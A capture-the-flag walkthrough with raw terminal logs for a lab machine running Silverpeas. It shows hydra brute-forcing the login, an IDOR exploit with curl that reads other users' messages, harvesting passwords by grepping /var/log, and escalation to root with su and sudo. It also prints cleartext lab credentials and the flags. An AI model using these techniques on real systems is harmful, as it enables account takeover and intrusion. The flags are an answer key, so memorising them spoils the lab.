@@ -1,0 +1,441 @@
+Silver Platter — Silverpeas Login & IDOR (Detailed)
+Phase 1: Finding the Username
+Where: http://10.48.187.1 (port 80, main website)
+
+What to do: Click the Contact tab on the homepage. You'll see text like:
+
+"If you'd like to get in touch with us, please reach out to our project manager on Silverpeas. His username is scr1ptkiddy."
+
+Why this matters:
+
+Gives you a username to brute force
+Tells you the CMS is Silverpeas → you now know what to search for on port 8080
+Phase 2: Finding Silverpeas on Port 8080
+Why port 8080? Your initial nmap scan showed:
+
+8080/tcp  open  http-proxy  nginx
+
+How to find the login page:
+
+URL	Result
+http://10.48.187.1:8080/	404 or redirect
+http://10.48.187.1:8080/silverpeas/	Login page ✅
+
+You could also fuzz for it:
+
+ffuf -u http://10.48.187.1:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 404
+
+Phase 3: Brute Forcing the Password
+Why not just try common passwords? The room description says:
+
+"their password policy requires passwords that have not been breached (they check it against the rockyou.txt wordlist)"
+
+So rockyou.txt won't work. You need a custom wordlist from the website itself.
+
+Step A — Generate wordlist:
+
+cewl -m 3 -d 2 -A -w wordlist.txt http://10.48.187.1
+
+Flag	Purpose
+-m 3	Minimum word length = 3
+-d 2	Crawl 2 levels deep (follows links)
+-A	Extract words with numbers (e.g., scr1ptkiddy)
+
+Step B — Brute force:
+
+hydra -l scr1ptkiddy -P wordlist.txt 10.48.187.1 -s 8080 \
+  http-post-form "/silverpeas/AuthenticationServlet:Login=^USER^&Password=^PASS^&DomainId=0:F=Login or password incorrect"
+
+Part	Meaning
+-l scr1ptkiddy	Single username (fixed)
+-P wordlist.txt	Password list (one per line)
+-s 8080	Target port
+http-post-form	Custom POST-based login form
+F=Login or password incorrect	Fail string — hydra checks the response for this text to know if a password was wrong
+
+Result: password: adipiscing
+
+Phase 4: IDOR — The Core Exploit
+What is IDOR?
+
+The server uses an ID number in the URL to fetch a specific message. It checks if you're logged in, but NOT if the message belongs to you. So any ID works.
+
+How to find the vulnerable request:
+
+After logging in, go to Notifications → Messages
+Open DevTools (F12) → Network tab
+Click on a message to read it
+In the Network tab, find the request with:
+Name: ReadMessage.jsp
+Status: 200
+The full URL will be:
+http://10.48.187.1:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=5
+
+How to exploit:
+
+Method 1 — Browser (easiest):
+
+Just type in your address bar:
+
+http://10.48.187.1:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6
+
+Your browser automatically sends your JSESSIONID cookie (proves you're logged in). The server returns message #6 — which belongs to tim.
+
+Method 2 — curl (scriptable):
+
+# First, get your current JSESSIONID from browser DevTools → Application → Cookies
+# Then:
+curl -sk -b "JSESSIONID=your_cookie_value_here" \
+  "http://10.48.187.1:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6"
+
+⚠️ Common mistake: Writing -b "cookie_value" instead of -b "JSESSIONID=cookie_value". The name is required.
+
+Method 3 — Burp Repeater:
+
+Intercept the ReadMessage.jsp?ID=5 request
+Send to Repeater
+Change ID=5 → ID=6
+Send
+⚠️ Make sure the Cookie: JSESSIONID=... header is present in the Repeater request. If it's missing, add it manually.
+
+What you find in ID=6:
+
+Dude how do you always forget the SSH password? Use a password manager...
+Username: tim
+Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
+
+Phase 5: SSH → User Flag
+ssh tim@10.48.187.1
+# password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
+
+tim@silver-platter:~$ cat user.txt
+
+Phase 6: Privilege Escalation → Root
+Step 1 — Check your groups:
+
+id
+# uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
+
+adm group = read access to /var/log/ files (auth.log, syslog, etc.)
+
+Step 2 — Search logs for credentials:
+
+grep -Ri 'password' /var/log 2>/dev/null
+# or more targeted:
+grep -i 'password' /var/log/auth.log
+
+You'll find a line like:
+
+sudo: tyler : TTY=pts/0 ; PWD=/home/tyler ; COMMAND=/usr/bin/docker run --name postgresql -d -e POSTGRES_PASSWORD=_Zd_zx7N823/ ...
+
+Step 3 — Switch to tyler:
+
+su tyler
+# password: _Zd_zx7N823/
+
+Step 4 — Sudo to root:
+
+sudo -l
+# User tyler may run the following commands on silver-platter:
+#     (ALL : ALL) ALL
+
+sudo su
+cat /root/root.txt
+/////////////////////////////////////////////////////////////////////////////////////
+
+┌──(white㉿white)-[~/white/Documents/thm]
+└─$ nmap -sC -sV -p- 10.48.187.1   
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-11 19:12 +0530
+Nmap scan report for 10.48.187.1
+Host is up (0.038s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 15:26:d4:bc:55:bf:43:93:85:8f:77:0e:50:e3:81:11 (ECDSA)
+|_  256 8d:58:17:2d:a8:35:f4:bf:88:1b:f6:ea:af:32:04:12 (ED25519)
+80/tcp   open  http       nginx 1.18.0 (Ubuntu)
+|_http-title: Hack Smarter Security
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+8080/tcp open  http-proxy
+|_http-title: Error
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 Not Found
+|     Connection: close
+|     Content-Length: 74
+|     Content-Type: text/html
+|     Date: Sun, 11 Oct 2026 13:44:27 GMT
+|     <html><head><title>Error</title></head><body>404 - Not Found</body></html>
+|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SMBProgNeg, SSLSessionReq, Socks5, TLSSessionReq, TerminalServerCookie: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Length: 0
+|     Connection: close
+|   GetRequest, HTTPOptions: 
+|     HTTP/1.1 404 Not Found
+|     Connection: close
+|     Content-Length: 74
+|     Content-Type: text/html
+|     Date: Sun, 11 Oct 2026 13:44:26 GMT
+|_    <html><head><title>Error</title></head><body>404 - Not Found</body></html>
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8080-TCP:V=7.99%I=7%D=10/11%Time=6ACB92BB%P=x86_64-pc-linux-gnu%r(G
+SF:etRequest,C9,"HTTP/1\.1\x20404\x20Not\x20Found\r\nConnection:\x20close\
+SF:r\nContent-Length:\x2074\r\nContent-Type:\x20text/html\r\nDate:\x20Sun,
+SF:\x2011\x20Oct\x202026\x2013:44:26\x20GMT\r\n\r\n<html><head><title>Erro
+SF:r</title></head><body>404\x20-\x20Not\x20Found</body></html>")%r(HTTPOp
+SF:tions,C9,"HTTP/1\.1\x20404\x20Not\x20Found\r\nConnection:\x20close\r\nC
+SF:ontent-Length:\x2074\r\nContent-Type:\x20text/html\r\nDate:\x20Sun,\x20
+SF:11\x20Oct\x202026\x2013:44:26\x20GMT\r\n\r\n<html><head><title>Error</t
+SF:itle></head><body>404\x20-\x20Not\x20Found</body></html>")%r(RTSPReques
+SF:t,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nCon
+SF:nection:\x20close\r\n\r\n")%r(FourOhFourRequest,C9,"HTTP/1\.1\x20404\x2
+SF:0Not\x20Found\r\nConnection:\x20close\r\nContent-Length:\x2074\r\nConte
+SF:nt-Type:\x20text/html\r\nDate:\x20Sun,\x2011\x20Oct\x202026\x2013:44:27
+SF:\x20GMT\r\n\r\n<html><head><title>Error</title></head><body>404\x20-\x2
+SF:0Not\x20Found</body></html>")%r(Socks5,42,"HTTP/1\.1\x20400\x20Bad\x20R
+SF:equest\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(Gene
+SF:ricLines,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200
+SF:\r\nConnection:\x20close\r\n\r\n")%r(Help,42,"HTTP/1\.1\x20400\x20Bad\x
+SF:20Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(S
+SF:SLSessionReq,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\
+SF:x200\r\nConnection:\x20close\r\n\r\n")%r(TerminalServerCookie,42,"HTTP/
+SF:1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConnection:\x2
+SF:0close\r\n\r\n")%r(TLSSessionReq,42,"HTTP/1\.1\x20400\x20Bad\x20Request
+SF:\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(Kerberos,4
+SF:2,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConnec
+SF:tion:\x20close\r\n\r\n")%r(SMBProgNeg,42,"HTTP/1\.1\x20400\x20Bad\x20Re
+SF:quest\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(LPDSt
+SF:ring,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\n
+SF:Connection:\x20close\r\n\r\n")%r(LDAPSearchReq,42,"HTTP/1\.1\x20400\x20
+SF:Bad\x20Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n"
+SF:);
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 215.64 seconds
+
+──(white㉿white)-[~/white/Documents/thm]
+└─$ ffuf -u http://10.48.187.1:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt   
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.48.187.1:8080/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+console                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 301ms]
+website                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 85ms]
+:: Progress: [4614/4614] :: Job [1/1] :: 1000 req/sec :: Duration: [0:00:12] :: Errors: 0 ::
+                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Documents/thm]
+└─$ cewl -m 3 -w wordlist.txt http://10.48.187.1     
+CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
+                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Documents/thm]
+└─$ hydra -l scr1ptkiddy -P wordlist.txt 10.48.187.1 -s 8080 \
+  http-post-form "/silverpeas/AuthenticationServlet:Login=^USER^&Password=^PASS^&DomainId=0:F=Login or password incorrect"
+Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-11 19:21:26
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 344 login tries (l:1/p:344), ~22 tries per task
+[DATA] attacking http-post-form://10.48.187.1:8080/silverpeas/AuthenticationServlet:Login=^USER^&Password=^PASS^&DomainId=0:F=Login or password incorrect
+[8080][http-post-form] host: 10.48.187.1   login: scr1ptkiddy   password: adipiscing
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-11 19:21:47
+                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Documents/thm]
+└─$ ssh tim@10.48.187.1   
+The authenticity of host '10.48.187.1 (10.48.187.1)' can't be established.
+ED25519 key fingerprint is: SHA256:82CyEStimQRgSR115pVCdFJP+I/QWggZJwhB6sejisE
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.48.187.1' (ED25519) to the list of known hosts.
+adipiscing
+
+tim@10.48.187.1's password: 
+Permission denied, please try again.
+tim@10.48.187.1's password: 
+Connection closed by 10.48.187.1 port 22
+
+    <div class="content-notification rich-content">
+        Message:<div style="padding=10px 0 10px 0;"><br/>  <div style="background-color:#FFF9D7; border:1px solid #E2C822; padding:5px; width:600px;"><p>Dude how do you always forget the SSH password? Use a password manager and quit using your silly sticky notes.&nbsp;</p><p>Username: tim</p><p>Password:&nbsp;cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol</p></div><br/></div><!--BEFORE_MESSAGE_FOOTER--><!--AFTER_MESSAGE_FOOTER-->
+    </div>
+
+    ┌──(white㉿white)-[~/white/Documents/thm]
+└─$ curl -sk -b "JSESSIONID=w6knraDTQVxHBY_OPGZhnHT5OX0RlzZX55nqAEJB.ebabc79c6d2a" \
+  "http://10.48.187.1:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6"
+
+      
+      
+      
+      
+      
+    <div class="sp_buttonPane"><a class="sp_button" href="javascript:onClick=deleteMessage(6);" >Delete</a><a class="sp_button" href="javascript:onClick=window.close();" >Close</a></div>
+  </div>
+</div><script type='text/javascript' language='Javascript'>jQuery(document.body).ready(function(){currentPopupResize();});</script>
+
+</body>
+</html>
+                               
+                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Documents/thm]
+└─$ ssh tim@10.48.187.1   
+tim@10.48.187.1's password: 
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun Oct 11 02:05:58 PM UTC 2026
+
+  System load:  0.08349609375      Processes:                154
+  Usage of /:   60.3% of 12.94GB   Users logged in:          0
+  Memory usage: 53%                IPv4 address for docker0: 172.17.0.1
+  Swap usage:   0%                 IPv4 address for ens5:    10.48.187.1
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+Expanded Security Maintenance for Applications is not enabled.
+
+261 updates can be applied immediately.
+180 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+1 additional security update can be applied with ESM Apps.
+Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Wed Dec 13 16:33:12 2023 from 192.168.1.20
+tim@ip-10-48-187-1:~$ whoami
+tim
+tim@ip-10-48-187-1:~$ cat user.txt
+THM{c4ca4238a0b923820dcc509a6f75849b}
+tim@ip-10-48-187-1:~$ whomai
+Command 'whomai' not found, did you mean:
+  command 'whoami' from deb coreutils (8.32-4.1ubuntu1.2)
+Try: apt install <deb name>
+tim@ip-10-48-187-1:~$ grep -Ri 'password' /var/log 2>/dev/null
+/var/log/auth.log.1:Jul 21 20:10:26 ip-10-10-119-245 passwd[654]: password for 'ubuntu' changed by 'root'
+/var/log/auth.log.1:Oct 11 13:40:25 ip-10-48-187-1 passwd[656]: password for 'ubuntu' changed by 'root'
+/var/log/dmesg:[   14.069142] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
+/var/log/syslog.1:Jul 20 17:11:28 silver-platter kernel: [    5.166422] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
+/var/log/syslog.1:Jul 20 17:11:28 silver-platter systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
+/var/log/syslog.1:Jul 20 17:11:28 silver-platter systemd[1]: Condition check resulted in Forward Password Requests to Plymouth Directory Watch being skipped.
+/var/log/syslog.1:Jul 21 20:10:26 ip-10-10-119-245 systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
+/var/log/syslog.1:Jul 21 20:10:26 ip-10-10-119-245 systemd[1]: Condition check resulted in Forward Password Requests to Plymouth Directory Watch being skipped.
+/var/log/syslog.1:Jul 21 20:10:27 ip-10-10-119-245 kernel: [   10.355405] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
+/var/log/syslog.1:Oct 11 13:40:25 ip-10-48-187-1 systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
+/var/log/syslog.1:Oct 11 13:40:25 ip-10-48-187-1 systemd[1]: Condition check resulted in Forward Password Requests to Plymouth Directory Watch being skipped.
+/var/log/syslog.1:Oct 11 13:40:25 ip-10-48-187-1 kernel: [   14.069142] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
+/var/log/dmesg.0:[   10.355405] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
+/var/log/installer/subiquity-server-debug.log.2061:2023-12-12 18:31:50,969 DEBUG root:37 finish: subiquity/Identity/GET: SUCCESS: 200 {"realname": "", "username": "", "crypted_password": "", "hostname": ""}
+/var/log/installer/subiquity-server-debug.log:2023-12-12 18:31:50,969 DEBUG root:37 finish: subiquity/Identity/GET: SUCCESS: 200 {"realname": "", "username": "", "crypted_password": "", "hostname": ""}
+/var/log/installer/autoinstall-user-data:    password: $6$uJuA1kpnd4kTFniw$/402iWwKzcYD8AMHG6bY/PXwZWOkrrVmtoO7qQpfvVLh1CHmiKUodwMGP7/awDYtrzpDHV8cNbpS1HJ6VMakN.
+/var/log/installer/installer-journal.txt:Dec 12 12:30:38 ubuntu-server systemd[1]: Started Forward Password Requests to Wall Directory Watch.
+/var/log/installer/installer-journal.txt:Dec 12 12:30:39 ubuntu-server systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
+/var/log/installer/installer-journal.txt:Dec 12 12:30:39 ubuntu-server systemd[1]: Condition check resulted in Forward Password Requests to Plymouth Directory Watch being skipped.
+/var/log/installer/installer-journal.txt:Dec 12 12:30:50 ubuntu-server chpasswd[2085]: pam_unix(chpasswd:chauthtok): password changed for installer
+/var/log/installer/installer-journal.txt:Dec 12 18:33:31 ubuntu-server usermod[4729]: change user 'usbmux' password
+/var/log/installer/installer-journal.txt:Dec 12 18:33:31 ubuntu-server chage[4736]: changed password expiry for usbmux
+/var/log/installer/cloud-init.log:2023-12-12 12:30:49,407 - modules.py[DEBUG]: Running module set-passwords (<module 'cloudinit.config.cc_set_passwords' from '/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py'>) with frequency once-per-instance
+/var/log/installer/cloud-init.log:2023-12-12 12:30:49,407 - handlers.py[DEBUG]: start: modules-config/config-set-passwords: running config-set-passwords with frequency once-per-instance
+/var/log/installer/cloud-init.log:2023-12-12 12:30:49,407 - util.py[DEBUG]: Writing to /var/lib/cloud/instances/nocloud/sem/config_set_passwords - wb: [644] 24 bytes
+/var/log/installer/cloud-init.log:2023-12-12 12:30:49,407 - helpers.py[DEBUG]: Running config-set-passwords using lock (<FileLock using file '/var/lib/cloud/instances/nocloud/sem/config_set_passwords'>)
+/var/log/installer/cloud-init.log:2023-12-12 12:30:49,407 - ssh_util.py[DEBUG]: line 1: option PasswordAuthentication added with yes
+/var/log/installer/cloud-init.log:2023-12-12 12:30:49,463 - cc_set_passwords.py[DEBUG]: Restarted the SSH daemon.
+/var/log/installer/cloud-init.log:2023-12-12 12:30:49,463 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords ran successfully
+/var/log/cloud-init.log:2025-07-21 20:10:26,507 - modules.py[DEBUG]: Running module set_passwords (<module 'cloudinit.config.cc_set_passwords' from '/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py'>) with frequency once-per-instance
+/var/log/cloud-init.log:2025-07-21 20:10:26,507 - handlers.py[DEBUG]: start: init-network/config-set_passwords: running config-set_passwords with frequency once-per-instance
+/var/log/cloud-init.log:2025-07-21 20:10:26,507 - util.py[DEBUG]: Writing to /var/lib/cloud/instances/i-0c065a0e91f7b4999/sem/config_set_passwords - wb: [644] 23 bytes
+/var/log/cloud-init.log:2025-07-21 20:10:26,508 - helpers.py[DEBUG]: Running config-set_passwords using lock (<FileLock using file '/var/lib/cloud/instances/i-0c065a0e91f7b4999/sem/config_set_passwords'>)
+/var/log/cloud-init.log:2025-07-21 20:10:26,508 - cc_set_passwords.py[DEBUG]: Leaving SSH config 'PasswordAuthentication' unchanged. ssh_pwauth=None
+/var/log/cloud-init.log:2025-07-21 20:10:26,508 - handlers.py[DEBUG]: finish: init-network/config-set_passwords: SUCCESS: config-set_passwords ran successfully and took 0.001 seconds
+/var/log/cloud-init.log:2026-10-11 13:40:23,706 - distros[DEBUG]: User ubuntu found in /etc/shadow. Checking for empty password
+/var/log/cloud-init.log:2026-10-11 13:40:25,021 - modules.py[DEBUG]: Running module set_passwords (<module 'cloudinit.config.cc_set_passwords' from '/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py'>) with frequency once-per-instance
+/var/log/cloud-init.log:2026-10-11 13:40:25,021 - handlers.py[DEBUG]: start: init-network/config-set_passwords: running config-set_passwords with frequency once-per-instance
+/var/log/cloud-init.log:2026-10-11 13:40:25,021 - util.py[DEBUG]: Writing to /var/lib/cloud/instances/i-06b4db71766511235/sem/config_set_passwords - wb: [644] 24 bytes
+/var/log/cloud-init.log:2026-10-11 13:40:25,022 - helpers.py[DEBUG]: Running config-set_passwords using lock (<FileLock using file '/var/lib/cloud/instances/i-06b4db71766511235/sem/config_set_passwords'>)
+/var/log/cloud-init.log:2026-10-11 13:40:25,022 - cc_set_passwords.py[DEBUG]: Leaving SSH config 'PasswordAuthentication' unchanged. ssh_pwauth=None
+/var/log/cloud-init.log:2026-10-11 13:40:25,022 - handlers.py[DEBUG]: finish: init-network/config-set_passwords: SUCCESS: config-set_passwords ran successfully and took 0.001 seconds
+/var/log/bootstrap.log:Shadow passwords are now on.
+/var/log/auth.log:Oct 11 13:53:51 ip-10-48-187-1 sshd[2469]: Failed password for tim from 192.168.146.39 port 34898 ssh2
+/var/log/auth.log:Oct 11 14:05:58 ip-10-48-187-1 sshd[2690]: Accepted password for tim from 192.168.146.39 port 36112 ssh2
+/var/log/auth.log.2:Dec 12 19:34:46 silver-platter passwd[1576]: pam_unix(passwd:chauthtok): password changed for tim
+/var/log/auth.log.2:Dec 12 19:39:15 silver-platter sudo:    tyler : 3 incorrect password attempts ; TTY=tty1 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/apt install nginx
+/var/log/auth.log.2:Dec 13 15:39:07 silver-platter usermod[1597]: change user 'dnsmasq' password
+/var/log/auth.log.2:Dec 13 15:39:07 silver-platter chage[1604]: changed password expiry for dnsmasq
+/var/log/auth.log.2:Dec 13 15:40:33 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name postgresql -d -e POSTGRES_PASSWORD=_Zd_zx7N823/ -v postgresql-data:/var/lib/postgresql/data postgres:12.3
+/var/log/auth.log.2:Dec 13 15:44:30 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database sivlerpeas:silverpeas-6.3.1
+/var/log/auth.log.2:Dec 13 15:45:21 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:silverpeas-6.3.1
+/var/log/auth.log.2:Dec 13 15:45:57 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:6.3.1
+/var/log/auth.log.2:Dec 13 16:17:31 silver-platter passwd[6811]: pam_unix(passwd:chauthtok): password changed for tim
+/var/log/auth.log.2:Dec 13 16:18:57 silver-platter sshd[6879]: Accepted password for tyler from 192.168.1.20 port 47772 ssh2
+/var/log/auth.log.2:Dec 13 16:32:54 silver-platter passwd[7174]: pam_unix(passwd:chauthtok): password changed for tim
+/var/log/auth.log.2:Dec 13 16:33:12 silver-platter sshd[7181]: Accepted password for tim from 192.168.1.20 port 50970 ssh2
+/var/log/auth.log.2:Dec 13 16:35:45 silver-platter sshd[7297]: Accepted password for tyler from 192.168.1.20 port 58172 ssh2
+/var/log/auth.log.2:Dec 13 16:45:33 silver-platter sshd[7622]: Accepted password for tyler from 192.168.1.20 port 33484 ssh2
+/var/log/auth.log.2:Dec 13 17:43:09 silver-platter sshd[7750]: Accepted password for tyler from 192.168.1.20 port 45796 ssh2
+/var/log/auth.log.2:Dec 13 17:51:30 silver-platter sshd[1370]: Accepted password for tyler from 192.168.1.20 port 60860 ssh2
+/var/log/auth.log.2:Dec 13 17:51:41 silver-platter sshd[1681]: Accepted password for tyler from 192.168.1.20 port 55392 ssh2
+tim@ip-10-48-187-1:~$ id
+uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
+tim@ip-10-48-187-1:~$ su tyler
+Password: 
+tyler@ip-10-48-187-1:/home/tim$ ls
+user.txt
+tyler@ip-10-48-187-1:/home/tim$ cat user.txt
+THM{c4ca4238a0b923820dcc509a6f75849b}
+tyler@ip-10-48-187-1:/home/tim$ su -l
+Password: 
+su: Authentication failure
+tyler@ip-10-48-187-1:/home/tim$ sudo su
+[sudo] password for tyler: 
+root@ip-10-48-187-1:/home/tim# cat root.txt
+cat: root.txt: No such file or directory
+root@ip-10-48-187-1:/home/tim# cat /root/root.txt
+THM{098f6bcd4621d373cade4e832627b4f6}
+root@ip-10-48-187-1:/home/tim# Connection to 10.48.187.1 closed by remote host.
+Connection to 10.48.187.1 closed.
+                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Documents/thm]
+└─$ 
+
